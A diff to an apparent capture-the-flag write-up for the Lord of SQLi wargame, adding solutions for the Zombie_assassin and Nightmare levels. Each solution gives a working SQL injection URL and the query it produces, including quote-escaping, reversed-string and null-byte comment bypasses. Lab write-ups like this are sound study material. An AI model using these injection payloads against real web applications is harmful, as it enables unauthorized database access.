@@ -387,3 +387,20 @@ like:
 Link: https://los.rubiya.kr/chall/succubus_37568a99f12e6bd2f097e8038f74d768.php?id=\&pw=%20or%201%23
 
 query : select id from prob_succubus where id='\' and pw=' or 1#'
+
+## Zombie_assassin
+
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Zombie_assassin.png)
+
+query : select id from prob_zombie_assassin where id='"\' and pw='or 1=1 #'
+
+Link: https://los.rubiya.kr/chall/zombie_assassin_eac7521e07fe5f298301a44b61ffeec0.php?id=%22&pw=%23%201=1%20ro
+
+
+## Nightmare
+
+![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Nightmare.png)
+
+query : select id from prob_nightmare where pw=('')=0') and id!='admin'
+
+https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php?pw=%27)=0%00
